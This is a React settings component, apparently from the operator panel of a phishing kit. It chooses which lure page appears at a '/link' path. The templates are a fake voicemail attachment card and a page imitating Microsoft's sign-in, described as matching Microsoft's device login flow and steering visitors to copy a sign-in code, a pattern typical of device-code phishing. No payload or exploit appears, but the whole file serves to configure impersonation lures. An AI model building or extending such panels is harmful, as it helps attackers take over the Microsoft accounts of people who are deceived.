import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';
import { settingsApi } from '../../api/client';
import { PageSpinner } from '../../components/ui/Shared';

const templates = [
  {
    id: 'voicemail',
    name: 'Voicemail Message',
    desc: 'Shows a voicemail attachment card with sign-in steps and a dark code box. Best for email-based phishing scenarios.',
    preview: '📂 Voicemail_Message.mp3 → Copy code → Continue to Microsoft',
  },
  {
    id: 'microsoft',
    name: 'Microsoft Sign-in',
    desc: 'Clean, minimal Microsoft login page with "Log in to Microsoft" heading and a sign-in code field. Matches official Microsoft device login flow.',
    preview: 'Log in to Microsoft → Your Sign-in Code → Sign in at Microsoft',
  },
];

export default function Settings() {
  const qc = useQueryClient();
  const { data: settings, isLoading } = useQuery({ queryKey: ['settings'], queryFn: settingsApi.get });

  const updateMut = useMutation({
    mutationFn: ({ key, value }) => settingsApi.set(key, value),
    onSuccess: () => qc.invalidateQueries({ queryKey: ['settings'] }),
  });

  if (isLoading) return <PageSpinner />;

  const current = settings?.link_template || 'voicemail';

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-2xl font-bold">Settings</h1>
        <p className="text-sm text-gray-500 mt-1">Configure panel and link page settings</p>
      </div>

      <div className="card-glow p-5">
        <h2 className="text-lg font-semibold mb-1">Link Page Template</h2>
        <p className="text-sm text-gray-500 mb-4">
          Choose which template is displayed when users visit <code className="bg-dark-700 px-1.5 py-0.5 rounded text-xs">/link</code>
        </p>

        <div className="grid gap-3">
          {templates.map(t => (
            <div
              key={t.id}
              onClick={() => updateMut.mutate({ key: 'link_template', value: t.id })}
              className={`rounded-lg border-2 p-4 cursor-pointer transition-all ${
                current === t.id
                  ? 'border-cyan-500 bg-cyan-500/5'
                  : 'border-dark-600 hover:border-dark-400'
              }`}
            >
              <div className="flex items-center justify-between mb-2">
                <div className="flex items-center gap-3">
                  <div className={`w-4 h-4 rounded-full border-2 flex items-center justify-center ${
                    current === t.id ? 'border-cyan-500' : 'border-gray-500'
                  }`}>
                    {current === t.id && <div className="w-2 h-2 rounded-full bg-cyan-500" />}
                  </div>
                  <span className="font-semibold text-sm">{t.name}</span>
                </div>
                {current === t.id && (
                  <span className="text-xs bg-cyan-500/20 text-cyan-400 px-2 py-0.5 rounded-full font-medium">Active</span>
                )}
              </div>
              <p className="text-xs text-gray-400 ml-7 mb-2">{t.desc}</p>
              <div className="text-xs text-gray-600 ml-7 font-mono">{t.preview}</div>
            </div>
          ))}
        </div>

        {updateMut.isPending && (
          <p className="text-xs text-gray-500 mt-3">Saving...</p>
        )}
      </div>
    </div>
  );
}
